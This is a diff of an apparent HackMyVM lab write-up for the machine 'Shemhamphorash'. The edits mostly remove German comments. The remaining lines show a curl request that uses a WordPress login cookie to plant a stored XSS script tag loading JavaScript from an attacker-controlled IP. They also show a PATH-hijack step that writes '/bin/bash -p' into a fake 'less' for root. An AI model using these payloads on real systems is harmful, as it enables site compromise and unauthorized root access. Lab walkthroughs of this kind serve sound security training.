@@ -9,7 +9,7 @@
     <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
 </head>
  <body>
-    <div class="header-bg">
+     <div class="header-bg">
         <h1>Shemhamphorash - HackMyVM - Level: Medium - Bericht</h1>
         <div class="level-container level-medium">
             <h2 class="level-medium-color">Medium</h2>
@@ -1171,10 +1171,7 @@ Dieser Payload versucht, den Browser des Opfers auf die URL <code>http://192.168
 <div class="code-block">
     <div class="terminal">
         <div class="prompt">┌──(root㉿CCat)-[~]
-└─# <span class="command"># Stelle sicher, dass dein blessed-Cookie noch gültig ist.
-# (Der Wert hier ist der, den du zuletzt als funktionierend bestätigt hast)
-
-curl -X POST 'http://shemhamphorash.local/sitecore/wp-admin/admin-ajax.php' \
+└─# <span class="command">curl -X POST 'http://shemhamphorash.local/sitecore/wp-admin/admin-ajax.php' \
 -H 'Cookie: wordpress_logged_in_b0701dcfcb81ecfdbc03102527da7cda=blessed%7C1748523509%7CDOGuCKygWRS0Qwudka8zrMI80Rtoot0TjpbMim0rshv%7Cfdd8b935d53965dd7b21cff726ada122eff0dc7544b03e994563d241a5edd63e' \
 --data-urlencode "action=easy_cookies_policy_save_settings" \
 --data-urlencode "maintext=&lt;script src='http://192.168.2.199:8000/xss_handler.js'&gt;&lt;/script&gt;" \ 
@@ -2175,7 +2172,7 @@ Administrator. It usually boils down to these three things:
 
 <div class="code-block">
     <div class="terminal">
-        <div class="prompt">caiaphas@shemhamphorash:/tmp$ <span class="command">cd /tmp/biner # (oder wo auch immer du dein schreibbares Verzeichnis hast)</span></div>
+        <div class="prompt">caiaphas@shemhamphorash:/tmp$ <span class="command">cd /tmp/biner</span></div>
     </div>
 </div>
 <div class="code-block">
@@ -2185,7 +2182,7 @@ Administrator. It usually boils down to these three things:
 </div>
 <div class="code-block">
     <div class="terminal">
-        <div class="prompt">caiaphas@shemhamphorash:/tmp/biner$ <span class="command">echo '/bin/bash -p' >> less # -p um Root-Rechte zu behalten</span></div>
+        <div class="prompt">caiaphas@shemhamphorash:/tmp/biner$ <span class="command">echo '/bin/bash -p' >> less </span></div>
     </div>
 </div>
 <div class="code-block">
